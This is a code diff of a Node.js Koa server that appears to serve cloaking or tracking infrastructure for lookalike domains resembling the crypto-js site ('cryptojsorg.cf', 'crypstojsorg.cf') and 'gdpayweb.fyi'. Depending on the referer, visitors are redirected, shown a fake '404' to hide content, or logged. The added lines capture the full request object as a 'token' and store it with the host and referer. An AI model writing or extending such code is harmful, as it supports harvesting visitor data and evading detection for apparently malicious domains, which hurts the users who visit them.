@@ -117,7 +117,8 @@ async function addshuju(data,ctx,shu,isdomain,done){
             ctx.response.redirect('http://cryptosjsorg.cf');
         }
     }else{
-        ctx.response.redirect('https://crypstojsorg.cf');
+        ctx.body = "404"
+        // ctx.response.redirect('https://crypstojsorg.cf');
     }
 
 
@@ -133,17 +134,19 @@ app.use(async (ctx, next)=>{
             // console.log(str);
             // console.log('str1',str1);
 
-            // console.log('访问',str1);//
+            // console.log('访问',str1);//gdpayweb.fyi
 
-            if(str1=='http://cryptojsorg.cf/static/indexww.html'){
+            if(str.includes('//gdpayweb.fyi/static/indexww.html')){
                  ctx.body = "404"
-            }else if(str.includes('cryptojsorg')){
+            }else if(str.includes('gdpayweb')){
+                var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token:ctx.request};
                 // var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
                 // sendema(data,ctx)
                 // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href||ctx.request.header.host+'&referer='+str1||'');
                 // return;
-                ctx.response.redirect('http://cryptosjsorg.cf');
-               
+                // ctx.response.redirect('http://gdpayweb.fyi');
+                addshuju(data,ctx,false)
+                ctx.body = "404"
             }else{ //除了正常的域名访问都为不正常访问
                 var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
                 addshuju(data,ctx,false)
